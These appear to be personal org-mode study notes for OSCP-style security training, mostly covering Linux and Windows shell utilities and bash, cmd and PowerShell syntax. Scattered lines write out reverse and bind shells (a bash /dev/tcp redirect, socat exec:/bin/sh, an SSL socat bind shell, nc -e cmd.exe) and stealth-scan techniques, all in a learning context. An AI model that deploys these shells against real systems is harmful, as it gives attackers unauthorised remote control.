;; -*- mode: org; eval: (company-mode -1); -*-
+ Book1: CISSP_ Certified Information Systems Security Professional Study Guide   (2011, John Wiley & Sons) (788 pages)
+ Book2: GSEC GIAC Security Essentials Certification All-in-One Exam Guide (555 pages)
+ Book3: Offensive Security - Offensive Security OSCP-Offensive Security Ltd (2020) (853 pages)
+ Book4: Internet Core Protocols The Definitive Guide Help for Network Administrators by Eric Hall (424 pages)
+ Book5: Linux Administration  A Beginner’s Guide, Wale Soyinka (2016, McGraw-Hill) (802 pages)
+ Book6: Windows Internals 7ed, Part 1, User Mode, (Win 10 and Win Server 2016) by David Solomon, etc. (805 pages)
+ Book7: Windows Internals 6ed, Part 2, Developer Reference, (Win 7 and Win Server 2008 R2) by David Solomon, etc. (594 pages)
================================================================================
+ CEH v9 gitbook?
  XSS Exploits cgisecurity.com

* Book3_Chapter 02-05 the basics
*** the linux filesystem hierachy standard(FHS)
   + /bin - basic programs (ls, cd, cat, etc.)
   + /sbin - system programs (fdisk, mkfs, sysctl, etc)
   + /etc - configuration files
   + /tmp - temporary files (typically deleted on boot)
   + /usr/bin - applications (apt, ncat, nmap, etc.)
   + /usr/share - application support and data files 

** linux shell utilities
*** the man page sections
   + the sections:
     | Section | Contents                                       |
     |---------+------------------------------------------------|
     | 1       | User Commands                                  |
     | 2       | Programming interfaces for kernel system calls |
     | 3       | Programming interfaces to the C library        |
     | 4       | Special files such as device nodes and drivers |
     | 5       | File formats                                   |
     | 6       | Games and amusements such as screen-savers     |
     | 7       | Miscellaneous                                  |
     | 8       | System administration commands                 |

  + Apart from the normal search, ~man -k keywords~: keyword search
  + ~man 5 passwd~

*** apropos [keyword]
     + searching the keyword in man page description section for possible instances.

*** mkdir -p(parent)
     + mkdir -p test/{recon,exploit,report} 

*** locate
     + sudo updatedb
     + locate sbd.exe

*** find
     + sudo find / -name sbd* 

     + *find vs locate*
       - find search, while locate use index; find is more flexible, while locate is faster.
       #+begin_quote
       The main advantage of find over locate is that it can search for files and directories by more than just the name. With find, we can search by file age, size, owner, file type, timestamp, permissions, and more.
       #+end_quote
       
*** ss -antlp
     + to dump socket statistics.
     + similar to netstat. It can display more TCP and state information than other tools. 

*** systemctl 
     + systemctl list-units
     + systemctl list-sockets
     + systemctl list-timers
     + systemctl list-dependencies
     + *systemctl list-unit-files*

*** env
     + echo $path
     + x=1 && echo $x
       - echo x //x
       - echo "x" //x
     + export x="2"
     + $$ //current shell pid

**** bash string literal
     + x=2
       - echo $((x++))
       - echo $((x + $x + x))

*** history
    + history
    + !number //or !!
    + ctrl+r //backward search
    + ctrl+s //forward search

    + //effected by 3 env params:
      - HISTSIZE //take effect immediately, numbers of commands stored in memory for the current session
      - HISTFILESIZE //numbers of commands to be stored in the .bash_history file
*** //File Descriptor
**** basic of FD
    | FD | pointer |
    |----+---------|
    | 0  | stdin   |
    | 1  | stdout  |
    | 2  | stderr  |

    + A File Descriptor (FD) is a number which refers to an open file.
      #+begin_quote
      Each process has its own private set of FDs, but FDs are inherited by child processes from the parent process.
      Every process should inherit three open FDs from its parent: *0 ("standard input")*, open for reading; and *1 ("standard output")* and *2 ("standard error")*, open for writing. A process that is started without one or more of these may behave unpredictably. (So never close stderr. Always redirect to /dev/null instead.)
      #+end_quote

    + FD 3,4, ..., 9 are for additional files, need to be open first before used. For more info see:
      - [Advanced Bash-Scripting Guide: Chapter 20. I/O Redirection.](https://tldp.org/LDP/abs/html/io-redirection.html)
      - [how do file descriptors work](https://stackoverflow.com/questions/7082001/how-do-file-descriptors-work)

      #+begin_src
      exec 5<> /tmp/foo  #open fd 5, touch foo if not exist.
      echo "1\n2\n 3456789" >&5
      exec 5>&- #close fd 3.
      cat /tmp/foo
      rm /tmp/foo
      #+end_src

**** FD, basic of redirecting
     + ~:> filename~ //truncates file "filename" to zero length, touch if not exist.
     + ~1>> filename~ //redirect and append stdout to file "filename"
     + ~M>N~ 
       - //"M" is a FD, which is defaults to 1 if not explicitly set.
       - // *"N" is a filename*.
       - //File descriptor "M" is redirect to file "N."
     + ~M>&N~
       - //"M" is a FD, which is defaults to 1 if not explicitly set.
       - // *"N" is a FD*.
       - //"M" is redirected to "N". All output of file pointed to by M gets sent to file pointed to by N.

     + 0<filename, <filename //accept input from a file "filename"
       - cat 0<filename, cat <filename //are semantically equivalent

     + ls ./nonExisting 2>error.txt
     + ls ./nonExisting 2>&1
     + wc -mwl < filename

**** advanced: the mechanisms && stdin, stdout, stderr redirecting.
     + ~bash -i >& /dev/tcp/192.168.140.1/1337 0>&1~ //the meaning.

***** the ~>&~ || ~&>~ //(if FD number is omitted):
      1. *syntax for redirecting stderr*, the 3 variants are semantically equivalent:
         - ~>& dst~
         - ~&> dst~
         - ~> dst 2>&1~ //most human readable
           #+begin_src
           strace -f bash -c 'ls a &> out' 2>&1 | grep -n dup2
           # open, 3(out) => 1(stdout)>3, (dup2(3, 1)) => 2(stderr)>1, (dup2(1, 2))
           strace -f bash -c 'ls a > out' 2>&1 | grep -n dup2
           # open, 3(out) => 1(stdout)>3, (dup2(3, 1))
           #+end_src

      2. *omitting FDs*, if:
         - ~<~ is the first character of the redirection operator: the redirection refers to FD 0(stdin) *dup2(3, 0)* //i.e. 0<fileIn
         - ~>~ is the first character of the redirection operator: the redirection refers to FD 1(stdout) *dup2(3, 1)* //i.e. 1>fileOut

***** the redirect operator: *associativity: l => r; the > operator only pass the pointer address of the FD*
      + ~ls > outFile 2>&1~ //direct both FD 2(stderr) and FD 1(stdout) to the outFile
      + ~ls 2>&1 > outFile~ //direct only FD 1(stdout) to the outFile, because the FD 2(stderr) was dumped to the FD 1 before the FD 1 goes to the outFile
      + ~strace -f bash -c 'ls 2>&1 > outFile' > ls.out 2>&1~ //dup2(oldFD, newFD)
        #+begin_src
        dup2(1, 2)         # pointer address 2 === 1
        # outFile -> 3
        dup2(3, 1)         # pointer address 1 === 3, hence stderr not included
        #+end_src
      + ~strace -f bash -c 'ls > outFile 2>&1' > lsall.out 2>&1~ //dup2(oldFD, newFD)
        #+begin_src
        # outFile -> 3
        dup2(3, 1)         # pointer address 1 === 3
        close(3)
        dup2(1, 2)         # pointer address 2 === 1, stderr included
        #+end_src

***** use the ~strace~:
      + ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ //grep -n 192.168.140.1 strace.out, check syscalls around the line
        - //1(stdout)>3(socket) => 0(stdin)>1(stdout, socket)
        - //since the socket is bidirectional, both read and write are legal.

*** apt(Advanced Package Tool)
    + apt update: update the db info
    + apt upgrade [<packageName>]
    + apt-cache search <keyword>: search in the cached package *description* for the keyword
    + apt show <packageName>
    + apt install
    + apt remove --purge

*** dpkg
    + ~dpkg -i <package.deb>~
    + ~dpkg -l [packageName]~ //with or without packageName
    + dpkg can call apt or use offline package
     
*** grep
    + ~grep [option] <regex> <file>~
      - //without group capturing
    + ~grep -n(--line-number) <keyword> <fileName>~ //show the line number
    + ~grep -ri <keyword> <directory>~
      - //read all files under each directory recursively, search for what matches the "keyword"
    + // some options:
      - i for --ignore-case 
      - v for --reverse(not contain pattern)
      - o for print --only-matching
        
**** bash regex group capturing (planB only. if group capturing is necessary, better use python)
     + [[https://stackoverflow.com/questions/1891797/capturing-groups-from-a-grep-regex][bash regex group capturing]]
     #+begin_src bash
files="*.jpg"
regex="[0-9]+_([a-z]+)_[0-9a-z]*"
for f in $files    # unquoted in order to allow the glob to expand
do
    if [[ $f =~ $regex ]]     # bash regex matcher
    then
        name="${BASH_REMATCH[1]}"
        echo "${name}.jpg"    # concatenate strings
        name="${name}.jpg"    # same thing stored in a variable
    else
        echo "$f doesn't match" >&2 # this could get noisy if there are a lot of non-matching files
    fi
done
     #+end_src

*** <<< (here string)
    + [Here Strings](https://tldp.org/LDP/abs/html/x17837.html)
    + [what does <<< mean](https://unix.stackexchange.com/questions/80362/what-does-mean)

    + read first second <<< "hello world"
    + cat <<< "string"
    + //the tricky part is, it pass the rhs as a string, as the "stdin" of the lhs function. But not all function work with "/dev/stdin".
    + xargs kill <<< "-1 $$" //because xargs works with "stdin"
      
*** << Here Documents (heredoc)
    + the heredoc feed a codeblock to the stdin of the <TGTCOMMAND>. (similar to <TGTCOMMAND> < command-file, where the command-file contains the content of the codeblock)

      - syntax
        #+begin_src bash
        <TGTCOMMAND> <<LimitString
        <command #1>                      # line1 of the codeblock
        <command #2>                      # line2 of the codeblock
        LimitString
        #+end_src
      - example
        #+begin_src bash
        cat <<MEOW
        The current working directory is: $PWD  # comment?
        You are logged in as: $(whoami)
        MEOW
        #+end_src

*** sed
    + ~sed -i.bak -e 's/sed/script/gi' fileName~ //edit --in-place, with backup fileName.bak, and --expression
    + ~echo 'sed in a shell' | sed 's/shell/subshell/g'~ //the last part is *regex flag*
      #+begin_quote
      If no ~-e script~, ~--expression=script~, ~-f script-file~, or ~--file=script-file~ option is given, then the first non-option argument is taken as the sed script to interpret. *All remaining arguments are names of input files; if no input files are specified, then the standard input is read.*
      #+end_quote

*** cut 
    + ~echo "one two, three" | cut -f 2 -d ','~ //-f for field number[ -ge 1 ], -d for the delimiter instead of the default TAB, [ $delimiter.length -eq 1 ]

*** awk
    + ~echo "one::two::three" | awk -F "::" '{print $1, $3}'~ //F to set the field separator
    + should multiple cut are involved, consider switching to awk
    + BEGIN and END block
      #+begin_src bash
awk '
BEGIN { print "Analysis of \"li\"" }
/<regex>/  { ++n }
END   { print "\"<regex>\" appears in", n, "records." }' mail-list
      #+end_src

*** head
    + ~head -vn linesNumber file~ //if no file presented, read stdin

*** sort
    + ~sort -urn~ //unique, reverse, numeric order.
    + ~ps -ef | sort [-t [delimiter]] -k 1d,1 -k 2n,2~ // d for dictionary-order(effected by LC_ALL), n for numeric, [delimiter] could be ":" "\t" "<tab>", etc.; *must specify an end position in multiple key scenario, otherwise an option will effect the whole line*.
      #+begin_quote
      KEYDEF is F[.C][OPTS][,F[.C][OPTS]] for start and stop position, where F is a field number and C a character position in the field; both are origin 1, and the stop position defaults to the line's end.  If neither -t nor -b is in effect, characters in a field are counted from the beginning of the preceding whitespace. OPTS is one or more single-letter ordering options [bdfgiMhnRrV], which override  global  ordering  options for that key. If no key is given, use the entire line as the key. Use --debug to diagnose incorrect key usage.
      #+end_quote

*** uniq
    + ~uniq -c~ //count the number of occurrences
    + //use this after sort, since ~uniq~ only eliminate identical neighbour strings

*** comm
    + ~comm -[123] fileA fileB~ //output three columns: UniqueOfFileA UniqueOfFileB CommonOfFileAB, use -[123] to specify the column to suppress. 

*** diff
    + ~diff -c fileA fileB~ //context, in separate context
    + ~diff -u fileA fileB~ //unified format, all in one.

*** vimdiff
    + ~vimdiff fileA fileB~
      - ~do~ //diffget (o for obtain): get from the other file
      - ~dp~ //diffput: put change to the other file
      - ~]c~ //jump to the next diff
      - ~[c~ //jump to the previous diff
      - ~C-w~ //change window
    + ~:h [vimCommands]~

*** process management
    + job(linux) vs. process: ~cat error.log | wc -m~ is a pipeline of two processes, which the shell consider as a single job.

*** background tasks
    + ~ping localhost &~
    + ~ping localhost~ ~C-z~ //suspend
    + ~bg~ or ~%1 &~ //resume the suspended task at background
    + ~fg~ or ~%1~ //resume the task at foreground
    + ~%~
      - ~%Number(a job-identifier)~ //a job spec(ification), for more info check man bash.
      - ~%String~ //%ping, strings that the command job begins with.
      - ~%+~ ~%%~ //current job
      - ~%-~ //previous job
*** process control
    + ~ps aux~
    + ~ps -ef~ //every, full-format listing
    + ~ps -t 0 -f~ //0 for tty0, - for no tty
    + ~ps -ef f~ //output modifier f as --forest, ASCII art forest tree
    + ~ps -fC [commandNameLessThan15Chars]~

*** kill
    + ~kill -L~ //list kill-signal names in a nice table 
    + ~kill -l 11~ //translate number 11 into a signal name
    + ~kill -9 -1~ //send SIGKILL to almost every processes, since a PID of -1 is special, it indicates all processes except the kill process itself and init.
    + ~kill [pid|jobSpec]~ //send default signal: SIGTERM, to the process|job.

*** tail
    + ~tail -f logFile.log~ //follow the update.
    + ~tail -n[LinesToDisplay]~ //default 10 lines if not specified
  
*** watch
    + ~watch -n 5 w~ //watch the w command(who is logged on and what they are doing) with interval of 5 seconds (default 2 seconds)
    + ~watch -n 1 'ps -ef | sort -k 4nr,4 | head -n 5'~ //watch at 1 second interval for the top 5 processes that has the highest cpu usage, among all processes.

*** wget: downloads files using the HTTP/HTTPS and FTP protocols.
    + ~wget -O report_wget.pdf https://www.offensive-security.com/reports/penetr ation-testing-sample-report-2013.pdf~ // -O as --output-document

*** curl
    + ~curl -o report.pdf https://www.offensive-security.com/reports/penetration -testing-sample-report-2013.pdf~ 

*** axel: FTP/HTTP/HTTPS download accelerator, use multiple connections
    + src:
    #+begin_src sh
axel -a -n 20 -o o.pdf https://example.com/o.pdf
  # -a for alternate progress indicator
  # -n for number of connections
    #+end_src

*** bash ENV variables: see ~man bash~
    + ~HISTCONTROL=ignoredups~

*** netcat //has several versions: nmap-ncat, nc
    + //the original version, ~nc -h ==> [v1.10-46]~
    + ~nc -[u]nlvp 1337 --allow 192.168.140.0/24~ //[u]dp, verbose, nodns, listening, port, allow access from a local network only.
    + ~nc -[u]nv 127.0.0.1 1337~
    + ~nc -znv[u] [ip] 1-100~ //(stealth)scan for listening daemons without sending any data to them. 
    + ~nc -nlvp 1337 > fileReceived~
    + ~nc -nv 127.0.0.1 1337 < fileToSend~
    + ~nc -nlvp 1337 < fileAvailable~
    + ~nc -nv 127.0.0.1 1337 > fileDownloaded~
    + //the nmap maintained version, ~ncat -h ==> [Ncat 7.91 (...nmap.org/ncat)]~: ipv6 support, ssl, etc.
    + ~nc -e cmd.exe --allow [ip] -vnlp 1337 --ssl~ //ssl
    + ~nc -vn [ip] 1337 --ssl~ //the nmap ver. ncat ssl connection
    TODO TCP handshaking and attack vector.(SYN -> SYN/ACK -> ACK)

**** TODO stealth scan (gsec stealth port scanning methods 1985)
    TODO how nc stealth scan work. (wireshark) (it is definitely not stealth: it break nc listening process.)
    + Inverse Mapping
    + Half Open Scan //scanner SYN, target SYN/ACK, scanner RST
    + FIN Scan //FIN on, closed port send RST, open port ignore the packet
    + Xmas Tree Scan //FIN URG PSH on, or all flags on? same as FIN
    + Null Scan //all flags off, same as FIN
    + //FIN, Xmas, Null scan does not work on Windows family/Cisco, HP/UX, IRIX, since they use somewhat different implementation which deviate from the standard.

*** ip
    + ~ip l(ink) show [device]~
    + ~ip a(ddress) show [device]~
    + ~ip r(oute) show~
    + ~ip link set device { up | down | arp { on | off } }~

**** ~ip neigh~ //RFC 4861, neighbor discovery && ipv6 slaac
    - *NS(neighbor solicitation)*: msg.dst === *solicited-node multicast address*
    - *NA(neighbor advertisement)*: the neighbor response with lladdr
    - *RS(router solicitation)*: msg.src === self generated link-local; msg.dst === ff02::2( *all router multicast address* )
    - *RA(router advertisement)*: msg.src === fe80::x(router link-local); msg.dst === ipv6 unicast address of the requester || ff02::1 ( *all nodes multicast address* )

***** *ipv6 slaac* (IPv6 Stateless Address Autoconfiguration)
      1. the device calculate a EUI-64 or random link-local address for itself, say *addrD*
      2. the device perform Duplicate Address Detection(DAD) by sending a *NS* message, in which, src = ::/128(unspecified address), dst = $addrD
      3. confirming no conflict, the device send a *RS* message, in which, src = $addrD, dst = ff02::2
      4. in response, the ipv6 router unicast an *RA* message, in which, src = fe80::x(router link-local), dst = $addrD; the message also contains ipv6 prefix, with which the device configure its *Global Unicast Address* (since the prefix and link-local is always 64 bits long); the message also contains other info such as MTU.

*** socat
    + ~socat [-u|U] TCP-LISTEN:127.0.0.1:1337,fork path/to/file~ //uni-directional mode: U for right to left, u for left to right. Be careful not to override the source file.
    + ~socat tcp-connect:127.0.0.1:1337 exec:/bin/sh,stderr,pty[,setsid,sigint,sane]~ //reverse shell
    + @Deprecated //misc methods:
      - ~socat -d -d TCP4-LISTEN:443 STDOUT~ //...but why bother
      - ~socat TCP4:127.0.0.1:443 EXEC:/bin/bash~ //...use the parameterizes
      
*** openssl
    + ~openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt~
      - ~cat bind_shell.key bind_shell.crt > bind_shell.pem~
      - ~sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash,stderr,pty,setsid,sigint,sane~ //bind_shell, can be connected with nc --ssl option

*** base64 encoding decoding
    + ~echo -n 'cat' | base64 -w 0~ //echo without trailing \n, base64 encoding without auto wrapping
    + ~echo -n 'Y2F0' | base64 -d~ //decode, -i ignore garbage for more tolerance

*** TODO system call tracing, libcall tracing // man syscall
    + ~strace~
      - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ // -f: trace child processes created, as a result of the fork(2), vfork(2), and clone(2) system calls (quote: man strace). grep -n 192.168.140.1 strace.out, check syscalls around the line
    + ~ltrace -f ls~ // -f: same with strace -f.

*** cat file to variable
    #+begin_src
    var = $( cat v.txt )
    #+end_src


** bash scripting
   + man bash
   + ~#!~ //the "shebang"
   + debug view: ~#!/bin/bash -x~

*** basic syntax
**** *EXPANSIONs*: (man bash::"expansion") 7(8?) kinds of expansions. including dollar sign, with or without single/double parenthesis
     #+begin_quote
       The order of expansions is: brace expansion; tilde expansion, parameter and variable expansion, arithmetic expansion, and command substitution (done in a left-to-right fashion); word splitting; and pathname expansion.
       On systems that can support it, there is an additional expansion available: process substitution. This is performed at the same time as tilde, parameter, variable, and arithmetic expansion and command substitution.
       After  these  expansions  are performed, quote characters present in the original word are removed unless they have been quoted themselves (quote removal).
       Only brace expansion, word splitting, and pathname expansion can increase the number of words  of  the  expansion; other expansions expand a single word to a single word. The only exceptions to this are the expansions of "$@" and "${name[@]}", and, in most cases, $* and ${name[*]} as explained above (see PARAMETERS).
     #+end_quote

***** (misc) double quotes, single quotes, dollar sign
    + // *the dollar sign is evaluated within double quotes, but not within single quotes*
      #+begin_src
      x=1; echo $x        # variables. Note: no space 
      echo "1 + $x"       # '1 + 1'.
      echo '1 + $x'       # '1 + $x'
      y2=1+$x             # "1+1"
      #+end_src

***** 1. brace expansion
         + ~echo a{b,c}e~ # abe ace
           #+begin_src bash
           ls /usr/{ucb/{ex,edit},lib/{ex?.?*,how_ex}}
           #+end_src
         + ~{x..y[..incr]}~ # x, y, incr are ints
           #+begin_src bash
           tCount=0
           for t in {1,{10..60..10}}; do
             echo "t=$t tCount=$tCount"
             (( tCount++ ))
           done 
           #+end_src

***** 2. tilde expansion
         + # the home directory of a login name:
           #+begin_src bash
           ls ~someLoginName
           #+end_src
           
***** 3. parameter (and variable) expansion 
      + # The `$' character introduces *parameter expansion*, command substitution, or arithmetic expansion.
          #+begin_src bash
          a=; b=1;
          echo ${a:-$b}             # 1   # a is null, use default value $b.
          echo ${a:=$b}             # 1   # a is null, assign a default value $b to a. Now a === $b.
          a=; echo ${a:?'err'}      # err # a is null | unset, output errMsg to stderr
          a=2; echo ${a:+$b}        # 1   # nothing happens if a is null | unset, else, output $b
          
          a='abcde'; arr=($(seq 1 10));
          echo ${a: -1}              # 'cde' # ${param:offset}, note the space if [offset -lt 0]
          echo ${a:2:2}              # 'cd'  # ${param:offset:length}
          echo ${arr[@]: -2}         # 9 10
          echo ${!arr[@]}            # 0..9  # print array keys
          echo ${#a}                 # 5     # print
          
          # ... a few more syntax with patterns are not included. see man bash::"parameter expansion"
          #+end_src

***** 4. command substitution: ~$(command)~ or ~`command`~
      #+begin_quote
        Bash performs the expansion by executing command in a subshell environment and replacing the  command  substitution  with  the  standard  output of the command, with any trailing newlines deleted.
      #+end_quote
        
***** 5. arithmetic expansion: ~$((expression))~: eval the arithmetic expression and substitute the result.
         - ~echo $(((1+1)**(1+2)))~     # 8
         - ~echo $(((1+1) % (1+2)))~    # 2
          
***** 6. process substitution: ~<(list) or >(list)~
      #+begin_quote
        Process substitution allows a process's input or output to be referred to using a filename. It takes the form of <(list) or >(list). *The process list is run asynchronously*, and its input or output appears as  a filename. This filename is passed as an argument to the current command as the result of the expansion. If the >(list) form is used, writing to the file will provide input for list. If the <(list) form is used, the file passed as an argument should be read to obtain the output of list. Process substitution is supported on systems that support named pipes (FIFOs) or the /dev/fd method of naming open files. When available, process substitution is performed simultaneously with parameter and variable expansion, command substitution, and arithmetic expansion.
      #+end_quote
      
***** ? 7. word splitting: *IFS*

***** 8. pathname expansion: man bash::"pattern matching"
      
***** # conclusion:
     + ~$(command)~: *command substitution*. execute the command in a subshell then substitute the expression with the stdout of the subshell.
       - ~user=$(whoami)~
     + ~(command)~: fork and execute the commands in a subshell, shared FDs with the parent shell. see *compound commands*
       - ~a=1;(a=2; echo $a); echo $a~       # 2\n1
     + ~$((expression))~: *arithmetic expansion*. substitute the expression with the result of the calculation.
       - ~a=$((1+1)); echo $a~               # 2
     + ~((expression))~ *math context*. see *compound commands*.
       - ~((a=1+1)); echo $a~                # 2
     + ~${...}~ *parameter (and variable) expansion*
       - ~echo ${a}, ${SHELL}~               # 2, /bin/bash
     + ~{ commands; }~: *group command*. execute the commands in the braces as a group in the current execution context.
         #+begin_src bash
         a=5; echo '5cContent' > 5c
         cat ${a}c                              # 5cContent
         #+end_src
     + other related:
       - ~a="ls"; $a -la;~                             # ls -la

**** *compound commands* (man bash::"compound commands")
***** ~(commands)~: *fork* and execute the commands in a *subshell*, shared FDs with the parent shell.
     + [[https://unix.stackexchange.com/questions/138463/do-parentheses-really-put-the-command-in-a-subshell][StackExchange::do parentheses really put the command in a subshell]]
       #+begin_quote
         A subshell starts out as an almost identical copy of the original shell process. Under the hood, the shell calls the *fork* system call, which creates a new process whose code and memory are copies. When the subshell is created, there are very few differences between it and its parent. In particular, they have the same variables. Even the $$ special variable keeps the same value in subshells: it's the original shell's process ID. Similarly $PPID is the PID of the parent of the original shell.
         *A subshell created by (…) has the same file descriptors as its creator*. *Some other means of creating subshells modify some file descriptors before executing user code*; for example, the left-hand side of a pipe runs in a subshell3 with standard output connected to the pipe. The subshell also starts out with the same current directory, the same signal mask, etc. ...
       #+end_quote
     
***** ~((expression))~: *math context*.
      #+begin_quote
        The expression is evaluated according to the rules described below under ARITHMETIC EVALUATION.  If the value of the expression is non-zero, the return status is 0; otherwise the return status is 1.  This is exactly equivalent to ~let "expression"~.
      #+end_quote
      #+begin_src bash
      let a=17+23; echo $a
      let a="17 + 23"; echo $a
      
      # (()) works identical to ~let~
      ((a += 7))
      if ((a > 5)); then echo 'a > 5'; fi
      (( 1 + 1 == 2 ? 1 : $(echo 'hi' >& 2; echo 1)))   # hi
      $(( 1 + 1 == 2 ? 1 : $(echo 'hi' >& 2; echo 1)))  # hi 1
      #+end_src
      
***** ~{ commands; }~: a *group command*. executed in the current shell environment
      #+begin_quote
        (the commands are simply) executed in the current shell environment. list must be terminated with a newline or semicolon. This is known as a group command. The return status is the exit status of list. ...
      #+end_quote

***** ? loop
      #+begin_src bash
      for i in {1,{10..60..10}}; do echo 10.11.1.$i; done         # note that no spaces between braces
      
      counter=1
      while [ $counter -lt 10 ]
      do
      echo "10.11.1.$counter"; ((counter++))
      done
      #+end_src
      + ~for name [ [ in [ word ... ] ] ; ] do list ; done~
      + ~for (( expr1 ; expr2 ; expr3 )) ; do list ; done~
      + ~select name [ in word ] ; do list ; done~

*** bash array (man bash::"Arrays")
     + ~arr=($(seq 1 10)); echo ${arr[2]}~             # 3
       
*** bash arguments
    | Sign      | Description                                                          |
    |-----------+----------------------------------------------------------------------|
    | $0        | argv[0]                                                              |
    | $1-$9     | argv[1]-argv[9]                                                      |
    | $#        | argc                                                                 |
    | $@        | argv                                                                 |
    | $?        | The exit status of the most recently run process                     |
    | $$        | The process ID of the current script                                 |
    | $USER     | The username of the user running the script                          |
    | $HOSTNAME | The hostname of the machine                                          |
    | $RANDOM   | A random number                                                      |
    | $LINENO   | The current line number in the script. (man bash::"Shell Variables") |
    | $-        | The current *set of options* of the shell. (man bash)                |

*** ? ~read~ //userInput
    + ~read -p~
        #+begin_src bash
        #!/bin/bash
        echo "y/N?"
        read answer
        echo "answer: $answer" 
        read -p 'id: ' id
        read -sp 'pw: ' pw;
        printf "\n\nid: $id, pw: $pw"
        #+end_src

*** if //conditioning
    #+begin_src
    if [ <some test> ] && [ <some test> ]
    then
      <actions>
    elif [ <some test> ] || [ <some test> ]
    then
      <actions>
    else
      <actions>
    fi
    #+end_src

*** test operators
    | Operator              | Description: Expression True if...     |
    |-----------------------+----------------------------------------|
    | !EXPRESSION           |                                        |
    | -n STRING             | STRING length is greater than zero     |
    | -z STRING             | The length of STRING is zero (empty)   |
    | STRING1 != STRING2    |                                        |
    | STRING1 = STRING2     |                                        |
    | INTEGER1 -eq INTEGER2 |                                        |
    | INTEGER1 -ne INTEGER2 |                                        |
    | INTEGER1 -gt INTEGER2 |                                        |
    | INTEGER1 -lt INTEGER2 |                                        |
    | INTEGER1 -ge INTEGER2 |                                        |
    | INTEGER1 -le INTEGER2 |                                        |
    | -d FILE               | FILE exists and is a directory         |
    | -e FILE               | FILE exists                            |
    | -r FILE               | FILE exists and has read permission    |
    | -s FILE               | FILE exists and it is not empty        |
    | -w FILE               | FILE exists and has write permission   |
    | -x FILE               | FILE exists and has execute permission |
    
*** bitwise
    #+begin_src bash
    printf '%X\n' "$(( 0x12345678 | 0xDEADBEEF ))"     # Bitwise OR
    printf '%X\n' "$(( 0x12345678 & 0xDEADBEEF ))"     # Bitwise AND
    printf '%X\n' "$(( 0x12345678 ^ 0xDEADBEEF ))"     # Bitwise XOR
    printf '%X\n' "$(( ~ 0x2C8B ))"                    # Bitwise NOT
    #+end_src
    
    





** cmd scripting
*** basic
    #+begin_src bat
    @echo off
    echo hi
    pause

    goto end
    echo 'skipped'
    :end

    @echo off 
    #+end_src

**** ~set~ //variables
     #+begin_src bat
     REM set                                  //list all existing env variables
     REM set [<variable>=[<string>]]
     REM set [/p] <variable>=[<promptString>]
     REM set /a <variable>=<expression>
    
     SETLOCAL
     SET /A a = 5  # natural
     SET /A b = 10 
     SET /A c = %a% + %b% 
     echo %c%
     ENDLOCAL
     #+end_src

**** ~for~ // no, use powershell
     + ~FOR /F "tokens=1-5" %%A IN ("This is a short sentence") DO @echo %%A %%B %%D~
     + ~FOR %%G IN (a,b,c) DO (md %%G)~ // mkdir a,b,c
     + //%% vs %, expect %% in .bat script file, expect % in a cmd prompt.

*** cat to variable
    + ~powershell -c "$v=cat file; $v"~


** cmd utilities
   + ~pathping -n ip~ //route tracing utility.
   + ~tracert ip~ //route tracing utility, less info than pathping.
   + ~netstat -an~ //display all connections and listening ports, in numerical form.
   + ~systeminfo~
   + ~tasklist /svc~ // display services hosted in each process; /v for verbose
   + ~taskkill /pid 1 /pid 2 /T~ //terminate all specified processes and their child processes; /F for forcefully end.
   + ~driverquery -v~
   + ~assoc~ //e.g. assoc .txt
   + ~ipconfig~ // /flushdns, /rebase, /renew
   + ~powercfg~ // /A list all available sleep states; /hibernate on | off; /energy 
   + ~shutdown~ // /h for hiberanate; /r /o restart to advanced start-up 
   + ~sfc /SCANNOW~ //Windows Resource Checker


** TODO powershell scripting
   + ~(Get-Host).version~
   + ~Get-Help(help)~
   + ~Set-ExecutionPolicy Unrestricted~
   + ~Get-ExecutionPolicy~
   + #!/bin/bash ~powershell -c ""~ //powershell parse syntax like $var within the parentheses while bash does not
   + ~echo ([System.Text.Encoding]::Default)~ //get system default text encoding
   + //the *square brackets*. No reference. But seems [.Net TypeName]::staticMethod is legal in powershell.

*** TODO breakpoint?

*** Base64 encoding in powershell
   + base 64 encoding
     #+begin_quote
     $txt = "こんにちは"
     $byte = ([System.Text.Encoding]::Default).GetBytes($txt)
     $b64enc = [Convert]::ToBase64String($byte)
     #+end_quote 
   + base 64 decoding
     #+begin_quote
     $b64str = "grGC8YLJgr+CzQ=="
     $b64dec = [Convert]::FromBase64String($b64str) //to 
     $byte2 = ([System.Text.Encoding]::Default).GetString($b64dec)
     #+end_quote 
    
*** basic syntax
**** $() //Subexpression operator 
     #+begin_quote
     Returns the result of one or more statements. For a single result, returns a scalar. For multiple results, returns an array. Use this when you want to use an expression within another expression.
     #+end_quote
     + ~Folder list: $((dir c:\ -dir).Name -join ', ')~ //Folder list: Program Files, Program Files (x86), Users, Windows

**** @() //Array subexpression operator
     #+begin_quote
     Returns the result of one or more statements as an array. If there is only one item, the array has only one member.
     #+end_quote
     + ~@(Get-CimInstance win32_logicalDisk)~

**** & //Call operator
     #+begin_quote
     Runs a command, script, or script block.
     #+end_quote 

     + ~$c = "get-executionpolicy"; & $c~
     + ~& "./file name with spaces.ps1"~ //invoke the .ps1 script

**** //script block
     #+begin_quote
     A script block returns the output of all the commands in the script block, either as a single object or as an array. 
     You can also specify a return value using the return keyword. The return keyword does not affect or suppress other output returned from your script block. However, the return keyword exits the script block at that line.
     #+end_quote

     + //example:
       #+begin_src
       $sb = {
           param($p1,$p2)
           $OFS=','
           "p1 is $p1, p2 is $p2, rest of args: $args"
       }
       Invoke-Command $sb -ArgumentList 1,2,3,4 //p1 is 1, p2 is 2, rest of args: 3,4 
       &$sb -p2 2 -p1 1 3 //p1 is 1, p2 is 2, rest of args: 3
       &$sb 2 1 3 //p1 is 2, p2 is 1, rest of args: 3
       #+end_src 

**** .. //range operator
     + ~1..10~
     + ~foreach ($a in 1..$max) {Write-Host $a}~
     + ~'a'..'f'~

**** $_ //delay bind operator, or "this" in foreach TODO
     + ~10..1~
     + ~5..-5 | ForEach-Object {Write-Output $_}~

**** , //comma operator
     #+begin_quote
     As a binary operator, the comma creates an array or appends to the array being created. In expression mode, as a unary operator, the comma creates an array with just one member. Place the comma before the member.
     #+end_quote

     + ~$myArray = 1,2,3~
     + ~$SingleArray = ,1~
     + ~Write-Output (,1)[0]~

**** ? //shortcut to where
